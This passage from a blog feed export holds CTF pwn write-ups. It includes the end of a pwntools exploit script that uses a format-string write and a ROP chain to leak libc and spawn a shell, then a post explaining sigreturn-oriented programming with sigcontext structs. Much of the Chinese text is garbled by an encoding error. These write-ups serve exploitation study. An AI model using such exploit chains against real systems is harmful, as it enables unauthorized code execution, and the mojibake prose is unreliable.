class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>gets_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'gets'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004013f3</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%520s%9$n'</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I want to hear your praise of Toka\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'I know you like him, but you must pass my level\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x40125D</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0xa00</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>puts <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>base <span class=\"token operator\">=</span> puts <span class=\"token operator\">-</span> <span class=\"token number\">0x84420</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>system <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> <span class=\"token number\">0x52294</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> <span class=\"token number\">0x1B45BD</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----------------->'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'I know you like him, but you must pass my level\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>base<span class=\"token operator\">+</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># ong_gadget base+0xe3b01</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "canary"
            ]
        },
        {
            "id": "http://example.com/2023/08/03/srop/",
            "url": "http://example.com/2023/08/03/srop/",
            "title": "srop",
            "date_published": "2023-08-03T14:51:25.000Z",
            "content_html": "<h1 id=\"srop\"><a class=\"markdownIt-Anchor\" href=\"#srop\">#</a> srop</h1>\n<h2 id=\"sropåŸç†\"><a class=\"markdownIt-Anchor\" href=\"#sropåŸç†\">#</a> srop åŸç†</h2>\n<h3 id=\"signal-æœºåˆ¶\"><a class=\"markdownIt-Anchor\" href=\"#signal-æœºåˆ¶\">#</a> signal æœºåˆ¶ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jc2lnbmFs\">Â¶</span></h3>\n<p>signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¿¡å·æœºåˆ¶å¸¸è§çš„æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>\n<p><img data-src=\"/img/srop/ProcessOfSignalHandlering.png\" alt=\"Process of Signal Handlering\"></p>\n<ol>\n<li>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ signal æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚</li>\n<li>å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œ<strong>ä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º Signal Frameã€‚** éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ã€‚** ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ sigreturn ä»£ç ã€‚</li>\n</ol>\n<p>å¯¹äº signal Frame æ¥è¯´ï¼Œä¼šå› ä¸ºæ¶æ„çš„ä¸åŒè€Œæœ‰æ‰€åŒºåˆ«ï¼Œè¿™é‡Œç»™å‡ºåˆ†åˆ«ç»™å‡º x86 ä»¥åŠ x64 çš„ sigcontext</p>\n<ul>\n<li>x86</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> __gsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> __fsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> __esh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> __dsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>x64</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __uint16_t        cwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __uint16_t        swd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  __uint16_t        ftw<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __uint16_t        fop<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __uint64_t        rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  __uint64_t        rdp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  __uint32_t        mxcsr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  __uint32_t        mxcr_mask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpxreg</span>    _st<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_xmmreg</span>    _xmm<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  __uint32_t        padding<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  __uint64_t r8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  __uint64_t r9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  __uint64_t r10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  __uint64_t r11<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  __uint64_t r12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  __uint64_t r13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  __uint64_t r14<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  __uint64_t r15<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  __uint64_t rdi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  __uint64_t rsi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  __uint64_t rbp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  __uint64_t rbx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  __uint64_t rdx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  __uint64_t rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  __uint64_t rcx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  __uint64_t rsp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  __uint64_t rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  __uint64_t eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> __pad0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  __uint64_t err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  __uint64_t trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  __uint64_t oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  __uint64_t cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  __extension__ <span class=\"token keyword\">union</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>signal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ**32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º <u>119(0x77)</u>ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º <u>15(0xf)</u></li>\n</ol>\n<h2 id=\"æ”»å‡»åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#æ”»å‡»åŸç†\">#</a> æ”»å‡»åŸç†</h2>\n<p>ä»”ç»†å›é¡¾ä¸€ä¸‹å†…æ ¸åœ¨ signal ä¿¡å·å¤„ç†çš„è¿‡ç¨‹ä¸­çš„å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå†…æ ¸ä¸»è¦åšçš„å·¥ä½œå°±æ˜¯ä¸ºè¿›ç¨‹ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æ¢å¤ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸»è¦çš„å˜åŠ¨éƒ½åœ¨ Signal Frame ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>\n<ul>\n<li>Signal Frame è¢«ä¿å­˜åœ¨ç”¨æˆ·çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ˜¯å¯ä»¥è¯»å†™çš„ã€‚</li>\n<li>ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ (kernel agnostic about signal handlers)ï¼Œå®ƒå¹¶ä¸ä¼šå»è®°å½•è¿™ä¸ª signal å¯¹åº”çš„ Signal Frameï¼Œæ‰€ä»¥å½“æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæ­¤æ—¶çš„ Signal Frame å¹¶ä¸ä¸€å®šæ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„ Signal Frameã€‚</li>\n</ul>\n<h3 id=\"è·å–-shell\"><a class=\"markdownIt-Anchor\" href=\"#è·å–-shell\">#</a> è·å– shell</h3>\n<p>é¦–å…ˆï¼Œæˆ‘ä»¬å‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æˆ·è¿›ç¨‹çš„æ ˆï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª Signal Frameï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œä»¥ 64 ä½ä¸ºä¾‹å­ï¼Œç»™å‡º Signal Frame æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯</p>\n<p><img data-src=\"/img/srop/srop-example-1.png\" alt=\"signal2-stack\"></p>\n<p>å½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellã€‚___(ç›¸å½“äºè¿˜åŸæˆ‘ä»¬è°ƒå¥½çš„å¯„å­˜å™¨çš„å€¼)</p>\n<h3 id=\"system-call-chains\"><a class=\"markdownIt-Anchor\" href=\"#system-call-chains\">#</a> system call chains</h3>\n<p>éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯å•ç‹¬çš„è·å¾—ä¸€ä¸ª shellã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯</p>\n<ul>\n<li><strong>æ§åˆ¶æ ˆæŒ‡é’ˆã€‚</strong></li>\n<li><strong>æŠŠåŸæ¥ rip æŒ‡å‘çš„ <code>syscall</code>  gadget æ¢æˆ <code>syscall; ret</code>  gadgetã€‚</strong></li>\n</ul>\n<p>å¦‚ä¸‹å›¾æ‰€ç¤º ï¼Œè¿™æ ·å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚</p>\n<p><img data-src=\"/img/srop/srop-example-2.png\" alt=\"signal2-stack\"></p>\n<h3 id=\"åç»­\"><a class=\"markdownIt-Anchor\" href=\"#åç»­\">#</a> åç»­ <span class=\"exturl\" 